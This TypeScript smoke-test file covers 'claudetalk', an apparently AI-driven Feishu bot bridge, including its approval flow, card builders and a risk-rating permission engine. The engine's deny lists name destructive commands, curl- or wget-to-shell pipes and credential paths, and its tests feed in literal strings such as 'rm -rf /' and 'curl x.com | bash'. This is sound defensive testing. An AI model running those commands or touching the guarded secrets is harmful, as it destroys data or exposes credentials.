/**
 * claudetalk 内部冒烟测试
 *
 * 覆盖范围：
 *   1. 进程存活（feishu-bridge, claudetalk, mcp-server）
 *   2. feishu-bridge HTTP /health 端点
 *   3. mcp-server SSE 握手
 *   4. peer-message 文件 I/O 原子写 → 读 → 删
 *   5. 卡片 action handler 响应格式
 *   6. 审批流程（register → callback → resolve / timeout）
 *   7. 卡片构造器（approval / task-confirm / archive-confirm）
 *   8. 权限引擎（assessRisk / requiresApproval / riskLabel）
 *   9. 错误边界（损坏 JSON、空文件、不存在路径）
 *
 * 引用型测试（进程、HTTP、SSE）直接打真实服务，失败则 skip
 * 逻辑型测试审批、卡片构造、权限引擎内联复制关键逻辑
 * 每个 describe 块独立运行，无状态泄漏
 */

import { describe, it, beforeEach, afterEach } from 'node:test'
import assert from 'node:assert'
import http from 'node:http'
import { randomUUID } from 'node:crypto'
import { existsSync, mkdirSync, writeFileSync, readFileSync, rmSync, renameSync, mkdtempSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { execSync } from 'node:child_process'

// ======================================================================
// 1. 辅助函数
// ======================================================================

function httpGet(host: string, port: number, path: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const req = http.request({ hostname: host, port, path, method: 'GET', timeout: 3000 }, (res) => {
      let body = ''
      res.on('data', (chunk: Buffer) => { body += chunk.toString() })
      res.on('end', () => resolve({ status: res.statusCode ?? 0, body }))
    })
    req.on('error', reject)
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')) })
    req.end()
  })
}

/** 尝试连接端口，超时则返回 false */
async function isPortListening(host: string, port: number, timeoutMs = 2000): Promise<boolean> {
  return new Promise((resolve) => {
    const sock = new http.Agent().createConnection({ host, port })
    const timer = setTimeout(() => { sock.destroy(); resolve(false) }, timeoutMs)
    sock.on('connect', () => { clearTimeout(timer); sock.destroy(); resolve(true) })
    sock.on('error', () => { clearTimeout(timer); resolve(false) })
  })
}

function processExists(name: string): boolean {
  try {
    execSync(`pgrep -f '${name}'`, { stdio: 'ignore', timeout: 3000 })
    return true
  } catch { return false }
}

/** 创建临时目录，返回路径 + cleanup 函数 */
function createTempDir(): { dir: string; cleanup: () => void } {
  const dir = mkdtempSync(join(tmpdir(), 'claudetalk-smoke-'))
  return {
    dir,
    cleanup: () => { try { rmSync(dir, { recursive: true }) } catch { /* best-effort */ } },
  }
}

// ======================================================================
// 2. 内联复制的关键逻辑（provenance: peer-message.ts）
// ======================================================================

interface PeerMessage {
  id: string
  from: string
  chatId: string
  messageId: string
  message: string
  createdAt: number
}

function pmGetFilePath(baseDir: string, botName: string): string {
  return join(baseDir, 'feishu', `bot_${botName}.json`)
}

function pmLoadMessages(baseDir: string, botName: string): PeerMessage[] {
  const fp = pmGetFilePath(baseDir, botName)
  try {
    if (existsSync(fp)) {
      return JSON.parse(readFileSync(fp, 'utf-8')) as PeerMessage[]
    }
  } catch { /* fall through */ }
  return []
}

function pmAtomicWrite(baseDir: string, botName: string, msgs: PeerMessage[]): void {
  const fp = pmGetFilePath(baseDir, botName)
  const tmpFp = fp + '.tmp'
  const feishuDir = join(baseDir, 'feishu')
  if (!existsSync(feishuDir)) mkdirSync(feishuDir, { recursive: true })
  writeFileSync(tmpFp, JSON.stringify(msgs, null, 2), 'utf-8')
  renameSync(tmpFp, fp)
}

function pmAppendMessage(baseDir: string, botName: string, msg: PeerMessage): void {
  const existing = pmLoadMessages(baseDir, botName)
  existing.push(msg)
  pmAtomicWrite(baseDir, botName, existing)
}

function pmRemoveMessages(baseDir: string, botName: string, ids: Set<string>): void {
  const existing = pmLoadMessages(baseDir, botName)
  const remaining = existing.filter(m => !ids.has(m.id))
  pmAtomicWrite(baseDir, botName, remaining)
}

// ======================================================================
// 3. 内联复制的审批引擎（provenance: approval-handler.ts）
// ======================================================================

type RiskLevel = 'L0' | 'L1' | 'L2' | 'L3'

interface ApprovalRequest {
  requestId: string
  riskLevel: RiskLevel
  messageSummary: string
  requesterId: string
  conversationId: string
  createdAt: number
  resolve: (approved: boolean) => void
  timer: NodeJS.Timeout
}

function createApprovalEngine() {
  const pending = new Map<string, ApprovalRequest>()
  const processed = new Set<string>()
  let seq = 0

  function finalize(requestId: string, approved: boolean, reason: string): void {
    const req = pending.get(requestId)
    if (!req) return
    clearTimeout(req.timer)
    pending.delete(requestId)
    processed.add(requestId)
    req.resolve(approved)
  }

  function register(
    requestId: string,
    riskLevel: RiskLevel,
    messageSummary: string,
    requesterId: string,
    conversationId: string,
    resolve: (approved: boolean) => void,
    timeoutMs = 180_000,
  ): void {
    const timer = setTimeout(() => finalize(requestId, false, 'timeout'), timeoutMs)
    pending.set(requestId, {
      requestId, riskLevel, messageSummary, requesterId, conversationId,
      createdAt: Date.now(), resolve, timer,
    })
  }

  function callback(value: Record<string, unknown>): { toast: { type: string; content: string } } {
    const requestId = (value?.request_id as string) || ''
    const decision = (value?.decision as string) || ''
    const clickerId = (value?.clicker_id as string) || ''

    if (!requestId || !decision) {
      return { toast: { type: 'error', content: '缺少审批参数' } }
    }

    if (processed.has(requestId)) {
      return { toast: { type: 'warning', content: '该审批请求已处理' } }
    }

    const req = pending.get(requestId)
    if (!req) {
      return { toast: { type: 'warning', content: '审批请求已过期或不存在' } }
    }

    if (clickerId && req.requesterId && clickerId !== req.requesterId) {
      return { toast: { type: 'error', content: '只有请求者本人可以审批' } }
    }

    const approved = decision === 'approve'
    finalize(requestId, approved, 'callback')
    return { toast: { type: 'info', content: approved ? '✅ 已批准' : '❌ 已拒绝' } }
  }

  function nextRequestId(): string {
    return `apr_${Date.now().toString(36)}_${(++seq).toString(36)}`
  }

  return { pending, register, callback, nextRequestId }
}

// ======================================================================
// 4. 内联复制的权限引擎（provenance: permission.ts）
// ======================================================================

const CRITICAL_PATH_PATTERNS = [
  /\.env$/i, /settings\.json$/i, /\.claudetalk/i, /credentials?/i,
  /secrets?/i, /token/i, /\.ssh\//i, /id_rsa/i, /\.git\/config/i,
]

const HIGH_RISK_KEYWORDS = [
  /\brm\s+-rf\b/i, /\bdd\s+if=/i, /\bchmod\s+777\b/i, /\bdrop\s+table\b/i,
  /\bformat\s+/i, /\bdel\s+\/f\b/i, /\brmdir\s+\/s\b/i, /remove\s+--force/i,
  /\bkill\s+-9\b/i, /\bmkfs\b/i, /\bwget\b.+\|\s*(bash|sh)\b/i, /\bcurl\b.+\|\s*(bash|sh)\b/i,
]

const WRITE_KEYWORDS = [
  /\b(写入|修改|编辑|删除|移动|重命名|创建)/,
  /\b(write|edit|delete|remove|mv|rename|cp|mkdir)\b/i,
]

function assessRisk(message: string): { level: RiskLevel; reason: string } {
  for (const p of HIGH_RISK_KEYWORDS) { if (p.test(message)) return { level: 'L3', reason: '' } }
  for (const p of CRITICAL_PATH_PATTERNS) { if (p.test(message)) return { level: 'L2', reason: '' } }
  for (const p of WRITE_KEYWORDS) { if (p.test(message)) return { level: 'L1', reason: '' } }
  return { level: 'L0', reason: '' }
}

function requiresApproval(level: RiskLevel): boolean {
  return level === 'L2' || level === 'L3'
}

function riskLabel(level: RiskLevel): string {
  switch (level) {
    case 'L0': return '安全'
    case 'L1': return '低风险'
    case 'L2': return '中等风险'
    case 'L3': return '高风险'
  }
}

// ======================================================================
// 5. 内联复制的卡片构造器（provenance: approval-handler.ts）
// ======================================================================

function buildApprovalCard(params: {
  riskLevel: RiskLevel; riskLabel: string; messageSummary: string
  requestId: string; requesterId: string; reason: string
}): string {
  const headerColor = params.riskLevel === 'L3' ? 'red' : params.riskLevel === 'L2' ? 'yellow' : 'blue'
  return JSON.stringify({
    config: { wide_screen_mode: true },
    header: { title: { tag: 'plain_text', content: `⚠️ 操作审批 — ${params.riskLabel}` }, template: headerColor },
    elements: [
      { tag: 'div', text: { tag: 'lark_md', content: `**风险等级**: ${params.riskLabel}\n**消息摘要**: ${params.messageSummary.slice(0, 200)}\n**评估原因**: ${params.reason}` } },
      { tag: 'hr' },
      { tag: 'action', actions: [
        { tag: 'button', text: { tag: 'plain_text', content: '✅ 批准' }, type: 'primary', value: { action_type: 'approval-action', request_id: params.requestId, decision: 'approve', clicker_id: params.requesterId } },
        { tag: 'button', text: { tag: 'plain_text', content: '❌ 拒绝' }, type: 'danger', value: { action_type: 'approval-action', request_id: params.requestId, decision: 'reject', clicker_id: params.requesterId } },
      ] },
      { tag: 'note', elements: [{ tag: 'plain_text', content: `审批请求: ${params.requestId} | 180秒后自动拒绝` }] },
    ],
  })
}

function buildTaskConfirmCard(params: {
  summary: string; taskId: string; type?: string; priority?: string; progressNotes?: string
}): string {
  const { summary, taskId, type, priority, progressNotes } = params
  const typeLabel = type ? ({ task: '任务', bug: '漏洞', feature: '功能', research: '调研', chore: '杂务' } as Record<string, string>)[type] || type : '任务'
  const priorityLabel = priority ? ({ low: '低', medium: '中', high: '高', critical: '紧急' } as Record<string, string>)[priority] || priority : '中'
  const body = [
    `**${summary}**`,
    type ? `\n类型：${typeLabel}` : '',
    priority ? `优先级：${priorityLabel}` : '',
    progressNotes ? `\n进度备注：${progressNotes}` : '',
    '\n确认将此对话加入待办？',
  ].filter(Boolean).join('\n')
  return JSON.stringify({
    config: { wide_screen_mode: true },
    header: { title: { tag: 'plain_text', content: '📌 确认待办任务' }, template: 'blue' },
    elements: [
      { tag: 'markdown', content: body },
      { tag: 'hr' },
      { tag: 'action', actions: [
        { tag: 'button', text: { tag: 'plain_text', content: '✅ 确认创建' }, type: 'primary', value: { action_type: 'confirm-task-create', task_id: taskId, summary, type: type || 'task', priority: priority || 'medium', progress_notes: progressNotes || '' } },
        { tag: 'button', text: { tag: 'plain_text', content: '❌ 取消' }, type: 'default', value: { action_type: 'dismiss' } },
      ] },
      { tag: 'note', elements: [{ tag: 'plain_text', content: '如需修改，对话框直接发送新指令即可' }] },
    ],
  })
}

function buildArchiveConfirmCard(messagePreview: string): string {
  return JSON.stringify({
    config: { wide_screen_mode: true },
    header: { title: { tag: 'plain_text', content: '📌 加入手机待办' }, template: 'blue' },
    elements: [
      { tag: 'markdown', content: `**确认将以下对话加入待办？**\n\n> ${messagePreview.slice(0, 200)}` },
      { tag: 'hr' },
      { tag: 'action', actions: [
        { tag: 'button', text: { tag: 'plain_text', content: '✅ 确认' }, type: 'primary', value: { action_type: 'confirm-archive' } },
        { tag: 'button', text: { tag: 'plain_text', content: '❌ 取消' }, type: 'default', value: { action_type: 'dismiss' } },
      ] },
    ],
  })
}

// ======================================================================
// 测试常量
// ======================================================================
const BRIDGE_PORT = 9878
const MCP_PORT = 9877

// ======================================================================
// Section 1: 进程存活
// ======================================================================
describe('1. Process Health', () => {
  const bridgeAlive = processExists('feishu-bridge')
  const claudetalkAlive = processExists('claudetalk-default')
  const mcpAlive = processExists('claudetalk-mcp')

  it('feishu-bridge is running', { skip: !bridgeAlive }, () => {
    assert.ok(bridgeAlive)
  })

  it('claudetalk-default is running', { skip: !claudetalkAlive }, () => {
    assert.ok(claudetalkAlive)
  })

  it('mcp-server is running', { skip: !mcpAlive }, () => {
    assert.ok(mcpAlive)
  })

  it.before(() => {
    if (!bridgeAlive) console.warn('[SKIP] feishu-bridge not running — check port 9878')
    if (!claudetalkAlive) console.warn('[SKIP] claudetalk-default not running — check process')
    if (!mcpAlive) console.warn('[SKIP] mcp-server not running — check port 9877')
  })
})

// ======================================================================
// Section 2: feishu-bridge HTTP Health
// ======================================================================
describe('2. feishu-bridge HTTP', () => {
  let alive = false

  it.before(async () => { alive = await isPortListening('127.0.0.1', BRIDGE_PORT) })

  it('GET /health returns 200 with status=ok', { skip: !alive, timeout: 3000 }, async () => {
    const { status, body } = await httpGet('127.0.0.1', BRIDGE_PORT, '/health')
    assert.strictEqual(status, 200)
    const data = JSON.parse(body)
    assert.strictEqual(data.status, 'ok')
    assert.strictEqual(data.service, 'feishu-bridge')
  })

  it('GET / returns 404', { skip: !alive, timeout: 3000 }, async () => {
    const { status } = await httpGet('127.0.0.1', BRIDGE_PORT, '/')
    assert.strictEqual(status, 404)
  })
})

// ======================================================================
// Section 3: mcp-server SSE
// ======================================================================
describe('3. mcp-server SSE', () => {
  let alive = false

  it.before(async () => { alive = await isPortListening('127.0.0.1', MCP_PORT) })

  it('GET /sse returns endpoint event within 5s', { skip: !alive, timeout: 5000 }, async () => {
    const sseData = await new Promise<string>((resolve, reject) => {
      const req = http.request({
        hostname: '127.0.0.1', port: MCP_PORT, path: '/sse', method: 'GET',
        headers: { Accept: 'text/event-stream' }, timeout: 4000,
      }, (res) => {
        let data = ''
        const timer = setTimeout(() => {
          req.destroy()
          resolve(data)
        }, 3000)
        res.on('data', (chunk: Buffer) => {
          data += chunk.toString()
          if (data.includes('event: endpoint')) {
            clearTimeout(timer)
            req.destroy()
            resolve(data)
          }
        })
        res.on('error', reject)
      })
      req.on('error', reject)
      req.on('timeout', () => { req.destroy(); reject(new Error('timeout')) })
      req.end()
    })
    assert.ok(sseData.includes('event: endpoint'), 'SSE endpoint event missing')
    assert.ok(sseData.includes('/message?sessionId='), 'sessionId missing from endpoint data')
  })
})

// ======================================================================
// Section 4: peer-message 文件 I/O
// ======================================================================
describe('4. Peer-message File I/O', () => {
  let tmpDir: string
  let cleanup: () => void
  const botName = 'smokebot'

  beforeEach(() => { const t = createTempDir(); tmpDir = t.dir; cleanup = t.cleanup })
  afterEach(() => cleanup())

  it('loadPeerMessages returns [] for missing file', () => {
    const msgs = pmLoadMessages(tmpDir, 'nonexistent')
    assert.deepStrictEqual(msgs, [])
  })

  it('loadPeerMessages returns [] for corrupt JSON', () => {
    const fp = pmGetFilePath(tmpDir, botName)
    mkdirSync(join(tmpDir, 'feishu'), { recursive: true })
    writeFileSync(fp, '{{{corrupt', 'utf-8')
    const msgs = pmLoadMessages(tmpDir, botName)
    assert.deepStrictEqual(msgs, [])
  })

  it('loadPeerMessages returns [] for empty file', () => {
    const fp = pmGetFilePath(tmpDir, botName)
    mkdirSync(join(tmpDir, 'feishu'), { recursive: true })
    writeFileSync(fp, '', 'utf-8')
    const msgs = pmLoadMessages(tmpDir, botName)
    assert.deepStrictEqual(msgs, [])
  })

  it('appendPeerMessage creates file with correct content', () => {
    const msg: PeerMessage = { id: randomUUID(), from: 'tester', chatId: 'oc_test', messageId: 'om_test', message: 'hello', createdAt: Date.now() }
    pmAppendMessage(tmpDir, botName, msg)
    const fp = pmGetFilePath(tmpDir, botName)
    assert.ok(existsSync(fp))
    const loaded = pmLoadMessages(tmpDir, botName)
    assert.strictEqual(loaded.length, 1)
    assert.strictEqual(loaded[0].id, msg.id)
    assert.strictEqual(loaded[0].message, 'hello')
  })

  it('appendPeerMessage preserves existing messages', () => {
    pmAppendMessage(tmpDir, botName, { id: 'a', from: 't', chatId: 'c', messageId: 'm1', message: 'm1', createdAt: 1 })
    pmAppendMessage(tmpDir, botName, { id: 'b', from: 't', chatId: 'c', messageId: 'm2', message: 'm2', createdAt: 2 })
    const loaded = pmLoadMessages(tmpDir, botName)
    assert.strictEqual(loaded.length, 2)
  })

  it('removePeerMessages removes only specified IDs', () => {
    pmAppendMessage(tmpDir, botName, { id: 'a', from: 't', chatId: 'c', messageId: 'm1', message: 'keep', createdAt: 1 })
    pmAppendMessage(tmpDir, botName, { id: 'b', from: 't', chatId: 'c', messageId: 'm2', message: 'remove', createdAt: 2 })
    pmAppendMessage(tmpDir, botName, { id: 'c', from: 't', chatId: 'c', messageId: 'm3', message: 'keep', createdAt: 3 })
    pmRemoveMessages(tmpDir, botName, new Set(['b']))
    const loaded = pmLoadMessages(tmpDir, botName)
    assert.strictEqual(loaded.length, 2)
    assert.ok(loaded.every(m => m.message === 'keep'))
  })

  it('removePeerMessages with empty Set does nothing', () => {
    pmAppendMessage(tmpDir, botName, { id: 'a', from: 't', chatId: 'c', messageId: 'm1', message: 'x', createdAt: 1 })
    pmRemoveMessages(tmpDir, botName, new Set())
    assert.strictEqual(pmLoadMessages(tmpDir, botName).length, 1)
  })

  it('atomic write leaves no .tmp file', () => {
    const msg: PeerMessage = { id: 'a', from: 't', chatId: 'c', messageId: 'm', message: 'x', createdAt: 1 }
    pmAppendMessage(tmpDir, botName, msg)
    const tmpPath = pmGetFilePath(tmpDir, botName) + '.tmp'
    assert.ok(!existsSync(tmpPath), '.tmp file should be cleaned up')
  })

  it('special characters survive round-trip', () => {
    const special = '你好 αβγ "quotes" \n newline \t tab \\ backslash'
    pmAppendMessage(tmpDir, botName, { id: 's', from: 't', chatId: 'c', messageId: 'm', message: special, createdAt: 1 })
    const loaded = pmLoadMessages(tmpDir, botName)
    assert.strictEqual(loaded[0].message, special)
  })

  it('creates feishu/ directory if not exists', () => {
    const msg: PeerMessage = { id: 'a', from: 't', chatId: 'c', messageId: 'm', message: 'x', createdAt: 1 }
    pmAppendMessage(tmpDir, botName, msg)
    assert.ok(existsSync(join(tmpDir, 'feishu')))
  })
})

// ======================================================================
// Section 5: 审批流程
// ======================================================================
describe('5. Approval Flow', { timeout: 3000 }, () => {
  it('approve via callback resolves with true', async () => {
    const engine = createApprovalEngine()
    const rid = engine.nextRequestId()
    const result = await new Promise<boolean>((resolve) => {
      engine.register(rid, 'L2', 'test', 'user_a', 'conv1', resolve, 500)
      process.nextTick(() => engine.callback({ request_id: rid, decision: 'approve', clicker_id: 'user_a' }))
    })
    assert.strictEqual(result, true)
  })

  it('reject via callback resolves with false', async () => {
    const engine = createApprovalEngine()
    const rid = engine.nextRequestId()
    const result = await new Promise<boolean>((resolve) => {
      engine.register(rid, 'L2', 'test', 'user_a', 'conv1', resolve, 500)
      process.nextTick(() => engine.callback({ request_id: rid, decision: 'reject', clicker_id: 'user_a' }))
    })
    assert.strictEqual(result, false)
  })

  it('timeout resolves with false', async () => {
    const engine = createApprovalEngine()
    const rid = engine.nextRequestId()
    const result = await new Promise<boolean>((resolve) => {
      engine.register(rid, 'L2', 'test', 'user_a', 'conv1', resolve, 50)
    })
    assert.strictEqual(result, false)
  })

  it('missing params returns error toast', () => {
    const engine = createApprovalEngine()
    const resp = engine.callback({ request_id: '', decision: '' })
    assert.strictEqual(resp.toast.type, 'error')
  })

  it('duplicate callback returns warning toast', () => {
    const engine = createApprovalEngine()
    const rid = engine.nextRequestId()
    engine.register(rid, 'L2', 'test', 'user_a', 'conv1', () => {}, 500)
    engine.callback({ request_id: rid, decision: 'approve', clicker_id: 'user_a' })
    const dup = engine.callback({ request_id: rid, decision: 'approve', clicker_id: 'user_a' })
    assert.strictEqual(dup.toast.type, 'warning')
  })

  it('unknown requestId returns warning toast', () => {
    const engine = createApprovalEngine()
    const resp = engine.callback({ request_id: 'nonexistent', decision: 'approve' })
    assert.strictEqual(resp.toast.type, 'warning')
  })

  it('clicker_id mismatch returns error toast', () => {
    const engine = createApprovalEngine()
    const rid = engine.nextRequestId()
    engine.register(rid, 'L2', 'test', 'user_a', 'conv1', () => {}, 500)
    const resp = engine.callback({ request_id: rid, decision: 'approve', clicker_id: 'user_b' })
    assert.strictEqual(resp.toast.type, 'error')
  })
})

// ======================================================================
// Section 6: 卡片构造器
// ======================================================================
describe('6. Card Builders', () => {
  it('buildApprovalCard L3 uses red header', () => {
    const json = JSON.parse(buildApprovalCard({ riskLevel: 'L3', riskLabel: '高风险', messageSummary: 'delete .env', requestId: 'r1', requesterId: 'u1', reason: 'danger' }))
    assert.strictEqual(json.header.template, 'red')
    assert.ok(json.header.title.content.includes('高风险'))
  })

  it('buildApprovalCard L2 uses yellow header', () => {
    const json = JSON.parse(buildApprovalCard({ riskLevel: 'L2', riskLabel: '中等风险', messageSummary: 'edit settings', requestId: 'r2', requesterId: 'u1', reason: 'config change' }))
    assert.strictEqual(json.header.template, 'yellow')
  })

  it('buildApprovalCard contains approve/reject buttons', () => {
    const json = JSON.parse(buildApprovalCard({ riskLevel: 'L2', riskLabel: '中等风险', messageSummary: 'test', requestId: 'r3', requesterId: 'u1', reason: 'test' }))
    const action = json.elements.find((e: any) => e.tag === 'action')
    assert.ok(action, 'action element missing')
    assert.strictEqual(action.actions[0].value.action_type, 'approval-action')
    assert.strictEqual(action.actions[1].value.action_type, 'approval-action')
    assert.strictEqual(action.actions[0].value.decision, 'approve')
    assert.strictEqual(action.actions[1].value.decision, 'reject')
  })

  it('buildApprovalCard includes request_id and clicker_id', () => {
    const json = JSON.parse(buildApprovalCard({ riskLevel: 'L2', riskLabel: '中等风险', messageSummary: 'test', requestId: 'apr_test', requesterId: 'ou_user1', reason: 'test' }))
    const action = json.elements.find((e: any) => e.tag === 'action')
    assert.strictEqual(action.actions[0].value.request_id, 'apr_test')
    assert.strictEqual(action.actions[0].value.clicker_id, 'ou_user1')
  })

  it('buildTaskConfirmCard contains confirm-task-create action', () => {
    const json = JSON.parse(buildTaskConfirmCard({ summary: 'fix bug', taskId: 't1' }))
    const action = json.elements.find((e: any) => e.tag === 'action')
    assert.strictEqual(action.actions[0].value.action_type, 'confirm-task-create')
  })

  it('buildTaskConfirmCard includes summary and taskId', () => {
    const json = JSON.parse(buildTaskConfirmCard({ summary: 'fix login', taskId: 't-001', type: 'bug', priority: 'high', progressNotes: 'half done' }))
    const action = json.elements.find((e: any) => e.tag === 'action')
    assert.strictEqual(action.actions[0].value.task_id, 't-001')
    assert.strictEqual(action.actions[0].value.summary, 'fix login')
    assert.strictEqual(action.actions[0].value.type, 'bug')
    assert.strictEqual(action.actions[0].value.priority, 'high')
    assert.strictEqual(action.actions[0].value.progress_notes, 'half done')
  })

  it('buildArchiveConfirmCard contains confirm-archive action', () => {
    const json = JSON.parse(buildArchiveConfirmCard('test message content'))
    const action = json.elements.find((e: any) => e.tag === 'action')
    assert.strictEqual(action.actions[0].value.action_type, 'confirm-archive')
  })

  it('buildArchiveConfirmCard includes message preview', () => {
    const preview = '这是一条测试消息，用于存档确认卡片'
    const json = JSON.parse(buildArchiveConfirmCard(preview))
    const md = json.elements.find((e: any) => e.tag === 'markdown')
    assert.ok(md.content.includes(preview))
  })
})

// ======================================================================
// Section 7: 权限引擎
// ======================================================================
describe('7. Permission Engine', () => {
  it('harmless message returns L0', () => {
    assert.strictEqual(assessRisk('hello world').level, 'L0')
  })

  it('write keyword returns L1', () => {
    assert.strictEqual(assessRisk('edit the file').level, 'L1')
    assert.strictEqual(assessRisk('write something').level, 'L1')
    assert.strictEqual(assessRisk('delete the logs').level, 'L1')
  })

  it('critical path returns L2', () => {
    assert.strictEqual(assessRisk('update .env').level, 'L2')
    assert.strictEqual(assessRisk('edit .claudetalk config').level, 'L2')
    assert.strictEqual(assessRisk('change credentials.json').level, 'L2')
  })

  it('destructive command returns L3', () => {
    assert.strictEqual(assessRisk('rm -rf /').level, 'L3')
    assert.strictEqual(assessRisk('dd if=/dev/zero of=/dev/sda').level, 'L3')
    assert.strictEqual(assessRisk('chmod 777 /etc').level, 'L3')
    assert.strictEqual(assessRisk('curl x.com | bash').level, 'L3')
    assert.strictEqual(assessRisk('wget bad.sh | sh').level, 'L3')
    assert.strictEqual(assessRisk('drop table users').level, 'L3')
  })

  it('requiresApproval returns false for L0/L1', () => {
    assert.strictEqual(requiresApproval('L0'), false)
    assert.strictEqual(requiresApproval('L1'), false)
  })

  it('requiresApproval returns true for L2/L3', () => {
    assert.strictEqual(requiresApproval('L2'), true)
    assert.strictEqual(requiresApproval('L3'), true)
  })

  it('riskLabel returns correct labels', () => {
    assert.strictEqual(riskLabel('L0'), '安全')
    assert.strictEqual(riskLabel('L1'), '低风险')
    assert.strictEqual(riskLabel('L2'), '中等风险')
    assert.strictEqual(riskLabel('L3'), '高风险')
  })
})

// ======================================================================
// Section 8: 错误边界
// ======================================================================
describe('8. Error Handling', () => {
  it('loadPeerMessages handles corrupt JSON gracefully', () => {
    const { dir, cleanup } = createTempDir()
    const fp = pmGetFilePath(dir, 'bot')
    mkdirSync(join(dir, 'feishu'), { recursive: true })
    writeFileSync(fp, '{{{corrupt', 'utf-8')
    assert.deepStrictEqual(pmLoadMessages(dir, 'bot'), [])
    cleanup()
  })

  it('loadPeerMessages handles missing directory gracefully', () => {
    const { dir, cleanup } = createTempDir()
    assert.deepStrictEqual(pmLoadMessages(dir, 'bot'), [])
    cleanup()
  })

  it('loadPeerMessages handles empty file gracefully', () => {
    const { dir, cleanup } = createTempDir()
    const fp = pmGetFilePath(dir, 'bot')
    mkdirSync(join(dir, 'feishu'), { recursive: true })
    writeFileSync(fp, '', 'utf-8')
    assert.deepStrictEqual(pmLoadMessages(dir, 'bot'), [])
    cleanup()
  })

  it('removePeerMessages with non-existent IDs is no-op', () => {
    const { dir, cleanup } = createTempDir()
    pmAppendMessage(dir, 'bot', { id: 'a', from: 't', chatId: 'c', messageId: 'm', message: 'x', createdAt: 1 })
    pmRemoveMessages(dir, 'bot', new Set(['nonexistent']))
    assert.strictEqual(pmLoadMessages(dir, 'bot').length, 1)
    cleanup()
  })

  it('removePeerMessages from non-existent file is no-op', () => {
    const { dir, cleanup } = createTempDir()
    assert.doesNotThrow(() => pmRemoveMessages(dir, 'nonexistent', new Set(['a'])))
    cleanup()
  })

  it('appendPeerMessage to non-existent dir auto-creates', () => {
    const { dir, cleanup } = createTempDir()
    const msg: PeerMessage = { id: 'x', from: 't', chatId: 'c', messageId: 'm', message: 'x', createdAt: 1 }
    assert.doesNotThrow(() => pmAppendMessage(dir, 'bot', msg))
    assert.ok(existsSync(join(dir, 'feishu')))
    cleanup()
  })
})
